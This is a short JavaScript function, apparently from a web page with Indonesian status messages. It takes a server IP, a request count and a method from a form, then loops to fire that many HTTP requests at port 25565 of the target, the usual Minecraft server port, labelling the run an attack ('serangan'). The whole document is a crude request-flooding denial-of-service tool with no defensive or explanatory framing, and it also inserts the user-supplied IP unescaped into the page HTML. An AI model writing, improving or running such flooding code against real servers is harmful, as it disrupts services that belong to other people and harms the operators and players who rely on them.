function startAttack() {
    let serverIP = document.getElementById("serverIP").value;
    let requestCount = parseInt(document.getElementById("requestCount").value);
    let attackMethod = document.getElementById("attackMethod").value;
    let statusDiv = document.getElementById("status");

    if (!serverIP || requestCount <= 0) {
        alert("Masukkan IP yang benar dan jumlah request yang valid!");
        return;
    }

    statusDiv.innerHTML = "Memulai serangan ke " + serverIP + " dengan metode " + attackMethod;

    for (let i = 0; i < requestCount; i++) {
        if (attackMethod === "ping") {
            fetch(`http://${serverIP}:25565/ping`).catch(err => console.log("Ping failed"));
        } else if (attackMethod === "tcp") {
            fetch(`http://${serverIP}:25565/tcp`).catch(err => console.log("TCP failed"));
        } else if (attackMethod === "bot") {
            fetch(`http://${serverIP}:25565/bot`).catch(err => console.log("Bot spam failed"));
        }
    }

    statusDiv.innerHTML += "<br>Serangan selesai!";
}
